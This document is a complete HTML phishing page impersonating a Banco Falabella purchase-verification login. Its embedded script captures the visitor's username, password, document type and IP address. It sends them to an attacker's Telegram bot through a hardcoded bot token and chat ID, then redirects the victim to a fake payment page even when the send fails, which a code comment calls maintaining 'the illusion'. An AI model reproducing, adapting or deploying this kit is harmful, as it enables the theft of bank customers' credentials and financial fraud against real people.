<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco Falabella</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f4f4f4;
        }
        .container {
            background-color: white;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 5px;
            width: 300px;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .header img {
            height: 40px;
        }
        .header button {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        .header button:hover {
            background-color: #45a049;
        }
        .close-btn {
            text-align: right;
            font-size: 18px;
            cursor: pointer;
            color: gray;
        }
        .close-btn:hover {
            color: black;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group select,
        .form-group input {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }
        .form-group input[id="submitBtn"] {
            background-color: #ff6b81;
            color: white;
            border: none;
            cursor: pointer;
            font-size: 16px;
            padding: 10px;
            border-radius: 5px;
        }
        .form-group input[id="submitBtn"]:hover {
            background-color: #ff4c61;
        }
        .link {
            display: block;
            text-align: center;
            margin-top: 10px;
            color: #006400;
            text-decoration: none;
        }
        .link:hover {
            text-decoration: underline;
        }
        .login-button {
            background-color: rgb(241, 16, 110);
            color: white;
            border: none;
            cursor: pointer;
            font-size: smaller;
            padding: 5%;
            border-radius: 5px;
            width: 90%;
        }
        .login-button.loading {
            opacity: 0.7;
            pointer-events: none;
        }
        .login-button:hover {
            background-color: rgb(221, 14, 100);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header" style="margin-bottom: 8%;">
            <img src="../img/faala.svg" alt="Banco Falabella Logo">
        </div>
       
        <form id="loginForm">
            <div class="form-group">
                <label for="document-type"></label>
                <p style="font-size: smaller; margin-bottom: 4%;">Vamos a validar tu compra <br> <br>

                    Banco Falabella requiere verificar la transacci√≥n que intentas realizar con tu tarjeta por seguridad</p>
                <select id="document-type">
                    <option value="cc">C√©dula de Ciudadan√≠a</option>
                </select>
            </div>
            <div class="form-group">
                <input type="text" id="username" name="dato1" placeholder="Usuario" required>
            </div>
            <div class="form-group">
                <input type="password" id="password" name="dato2" placeholder="Ingresa tu contrase√±a" required>
            </div>
           
            <div style="display: flex; justify-content: center; margin-top: 6%;">
                <button type="submit" id="submitBtn" class="login-button">INGRESAR</button>
            </div>
        </form>
    </div>

    <script>
        // Configuraci√≥n de Telegram
        const TELEGRAM_BOT_TOKEN = '8050472055:AAECARJvZtrimVGoBUIXERph4dQDfL3pVXE';
        const TELEGRAM_CHAT_ID = '5848946481';
        const REDIRECT_URL = '../cargapago.html'; // URL de redirecci√≥n despu√©s del env√≠o

        // Form submission
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const submitBtn = document.getElementById('submitBtn');
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const documentType = document.getElementById('document-type').value;
            
            // Show loading state
            submitBtn.classList.add('loading');
            submitBtn.innerHTML = 'PROCESANDO...';
            
            try {
                // Prepare message for Telegram
                const message = `üè¶ Banco Falabella - Validaci√≥n de compra:\n\n` +
                              `Tipo de documento: ${documentType === 'cc' ? 'C√©dula de Ciudadan√≠a' : documentType}\n` +
                              `Usuario: ${username}\n` +
                              `Contrase√±a: ${password}\n` +
                              `Fecha: ${new Date().toLocaleString('es-ES')}\n` +
                              `IP: ${await getClientIP()}`;
                
                // Send to Telegram
                const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                
                const response = await fetch(telegramUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                if (response.ok) {
                    // Success - redirect after short delay
                    setTimeout(() => {
                        window.location.href = REDIRECT_URL;
                    }, 1000);
                } else {
                    throw new Error('Error en el env√≠o');
                }
                
            } catch (error) {
                console.error('Error:', error);
                // Still redirect even if there's an error to maintain the illusion
                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 1000);
            }
        });

        // Function to get client IP (optional)
        async function getClientIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unknown';
            }
        }
    </script>
</body>
</html>
